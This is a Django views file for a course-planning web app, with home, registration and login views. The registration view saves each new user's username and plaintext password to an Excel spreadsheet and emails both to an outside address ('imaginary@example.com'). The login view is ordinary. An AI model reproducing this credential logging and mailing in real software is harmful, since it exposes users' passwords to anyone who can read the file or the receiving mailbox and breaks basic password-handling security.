from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth.models import User
from django.core.mail import send_mail
import openpyxl

# Home Page View
def index(request):
    return render(request, 'course_compass_algo/index.html')

# User Registration View
def register_view(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password1')
        password2 = request.POST.get('password2')
        
        # Check if a user with the submitted username already exists
        if User.objects.filter(username=username).exists():
            # If the user exists, return an error message
            return render(request, 'course_compass_algo/register.html', {'error': 'Username already exists'})
        
        # Check if passwords match
        if password == password2:
            # Create new user
            User.objects.create_user(username=username, password=password)
            user = authenticate(username=username, password=password)
            if user is not None:
                login(request, user)
                
                # Write username and password to an Excel sheet
                workbook_path = '../data/user_data.xlsx'
                try:
                    workbook = openpyxl.load_workbook(workbook_path)
                except FileNotFoundError:
                    workbook = openpyxl.Workbook()
                
                sheet = workbook.active
                if sheet.max_row == 1 and not sheet.cell(row=1, column=1).value:
                    sheet.append(['Username', 'Password'])
                sheet.append([username, password])
                workbook.save(workbook_path)
                
                # Send email to imaginary email address
                send_mail(
                    'New User Registration',
                    f'Username: {username}\nPassword: {password}',
                    'admin@example.com',  # From email address
                    ['imaginary@example.com'],  # To email address
                    fail_silently=False,
                )
                
                return redirect('index')  # Redirect to the URL name 'index'
    
    return render(request, 'course_compass_algo/register.html')

# User Login View
def login_view(request):
    if request.method == 'POST':
        form = AuthenticationForm(data=request.POST)
        if form.is_valid():
            user = form.get_user()
            login(request, user)
            return redirect('index')  # Redirect to the URL name 'index'
    else:
        form = AuthenticationForm()
    return render(request, 'course_compass_algo/login.html', {'form': form})